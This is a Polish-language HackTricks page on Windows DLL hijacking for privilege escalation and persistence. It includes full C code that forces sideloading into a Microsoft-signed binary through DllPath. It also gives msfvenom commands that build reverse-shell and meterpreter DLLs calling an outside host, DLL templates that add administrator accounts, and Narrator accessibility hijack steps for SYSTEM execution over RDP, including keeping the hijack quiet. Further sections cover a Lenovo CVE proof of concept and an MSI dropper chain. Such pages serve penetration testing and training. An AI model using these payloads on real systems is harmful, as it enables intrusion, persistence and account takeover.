# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji, aby załadowała złośliwy DLL. Termin obejmuje kilka technik, takich jak **DLL Spoofing, Injection, and Side-Loading**. Jest używany głównie do wykonania kodu, osiągnięcia persistence oraz, rzadziej, privilege escalation. Pomimo skupienia się tutaj na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Common Techniques

Do DLL hijackingu stosuje się kilka metod, których skuteczność zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana prawidłowego DLL na złośliwy, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL w ścieżce wyszukiwania przed prawidłowym DLL, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwego DLL, który aplikacja załaduje, sądząc, że jest to brakujący wymagany DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastąpienie prawidłowego DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika razem ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

> [!TIP]
> Aby zobaczyć krok po kroku łańcuch łączący HTML staging, AES-CTR configs i .NET implants na bazie DLL sideloadingu, przejrzyj poniższy workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najczęstszym sposobem na znalezienie brakujących Dlls w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) ze sysinternals i **ustawienie** **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

a następnie wyświetlenie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dlls ogólnie**, zostaw to działające na kilka **sekund**.\
Jeśli szukasz **brakującego dll w konkretnym executable**, powinieneś dodać **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać capture wydarzeń**.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, najlepszą szansą jest możliwość **zapisania dll, który proces z wyższymi uprawnieniami spróbuje załadować** w jednym z miejsc, gdzie będzie on wyszukiwany. W związku z tym możemy **zapisć** dll w **folderze**, który jest przeszukiwany *przed* folderem zawierającym **oryginalny dll** (rzadki przypadek), lub będziemy mogli **zapisać** w folderze, w którym dll będzie poszukiwany, a oryginalny **dll nie istnieje** w żadnym z katalogów.

### Dll Search Order

W [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **można znaleźć szczegóły dotyczące tego, jak Dlls są ładowane.**

Aplikacje Windows szukają DLLi, podążając za zestawem **wstępnie zdefiniowanych ścieżek wyszukiwania** w określonej kolejności. Problem DLL hijackingu pojawia się, gdy złośliwy DLL zostanie celowo umieszczony w jednym z tych katalogów, tak że zostanie załadowany przed autentycznym DLL. Rozwiązaniem jest zapewnienie, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganych DLLi.

Poniżej widzisz **kolejność wyszukiwania DLL na systemach 32-bitowych**:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To jest **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Gdy jest wyłączony, current directory awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zwróć uwagę, że **dll może być ładowany wskazując ścieżkę absolutną zamiast samej nazwy**. W takim przypadku ten dll będzie **wyszukiwany tylko w tej ścieżce** (jeśli dll ma zależności, będą one wyszukiwane jak załadowane po nazwie).

Istnieją inne sposoby na zmianę kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu przy użyciu natywnych API ntdll. Przekazując tutaj katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowany DLL po nazwie (bez ścieżki absolutnej i bez użycia bezpiecznych flag ładowania), może zostać zmuszony do załadowania złośliwego DLL z tego katalogu.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Ta technika była zaobserwowana in-the-wild do uruchamiania multi-stage sideloading chains: początkowy launcher upuszcza helper DLL, który następnie uruchamia Microsoft-signed, hijackable binarkę z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu staging.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub lateralny), któremu **brakuje DLL**.
- Upewnij się, że masz **write access** do dowolnego **directory**, w którym będzie **searched for** **DLL**. Lokalizacja ta może być katalogiem wykonywalnego pliku lub katalogiem w systemowej ścieżce.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie dość rzadko można znaleźć uprzywilejowany plik wykonywalny pozbawiony dll** i jeszcze **rzadziej ma się uprawnienia zapisu w folderze na ścieżce systemowej** (domyślnie ich nie masz). Ale w błędnie skonfigurowanych środowiskach jest to możliwe.\
W przypadku, gdy masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **main goal of the project is bypass UAC**, możesz tam znaleźć **PoC** Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, gdzie masz write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Dla pełnego przewodnika, jak **wykorzystać Dll Hijacking do eskalacji uprawnień** przy posiadaniu uprawnień zapisu w **folderze PATH systemu** sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia zapisu w którymkolwiek folderze w PATH systemu.\
Inne ciekawe zautomatyzowane narzędzia do wykrywania tej podatności to **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy potrzebnych do pomyślnego exploitowania będzie **utworzenie dll, który eksportuje przynajmniej wszystkie funkcje, które plik wykonywalny zaimportuje z niego**. Zwróć uwagę, że Dll Hijacking przydaje się do [eskalacji z Medium Integrity do High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z [**High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **jak stworzyć prawidłowy dll** znajdziesz w tym studium dotyczącym dll hijacking pod kątem wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Co więcej, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll eksportującego funkcje niewymagane**.

## **Tworzenie i kompilacja DLL-ów**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to dll zdolny do **wykonania Twojego złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do rzeczywistej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proxify i **wygenerować proxified dll** lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje własne

Zauważ, że w kilku przypadkach Dll, które skompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary; jeśli tych funkcji nie ma, **binary nie będzie w stanie ich załadować** i **exploit zakończy się niepowodzeniem**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywny DLL w C z punktem wejścia w wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przewidywalny, specyficzny dla języka localization DLL przy uruchomieniu, który może zostać hijacked w celu arbitrary code execution i persistence.

Kluczowe fakty
- Ścieżka sprawdzania (aktualne buildy): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ścieżka legacy (starsze buildy): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli zapisywalny plik DLL kontrolowany przez atakującego istnieje pod ścieżką OneCore, zostanie załadowany i wykona się `DllMain(DLL_PROCESS_ATTACH)`. Eksporty nie są wymagane.

Odkrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Studium przypadku: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek demonstruje Phantom DLL Hijacking w Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzone jako **CVE-2025-1729**.

### Szczegóły podatności

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementacja exploitu

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zadanie zaplanowane uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli podczas wykonywania zadania zalogowany jest administrator, złośliwy DLL uruchamia się w sesji administratora z medium integrity.
4. Połącz standardowe techniki omijania UAC, aby podnieść uprawnienia z medium integrity do SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- Użytkownik pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), rekonstruując kolejny etap z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany EXE oraz złośliwy DLL w tym samym katalogu (przykładowa para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Gdy podpisany EXE zostanie uruchomiony, kolejność wyszukiwania DLL w Windows załaduje wsc.dll z katalogu roboczego jako pierwszy, wykonując kod atakującego pod podpisanym procesem nadrzędnym (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabela CustomAction:
- Szukaj wpisów uruchamiających wykonywalne pliki lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w CAB MSI:
- Administracyjne wypakowanie: msiexec /a package.msi /qb TARGETDIR=C:\out
- Albo użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez VBScript CustomAction. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading przy użyciu wsc_proxy.exe
- Upuść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: prawidłowo podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z katalogu, w którym się znajduje.
- wsc.dll: attacker DLL. Jeśli nie są wymagane konkretne exports, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekaż wymagane exports do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań eksportu użyj proxying framework (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który także wykona twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez hostujący plik binarny. Jeśli host używa ścieżek bezwzględnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność ładowania i należy je uwzględnić przy wyborze pliku binarnego hosta oraz zestawu eksportów.

## Referencje

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
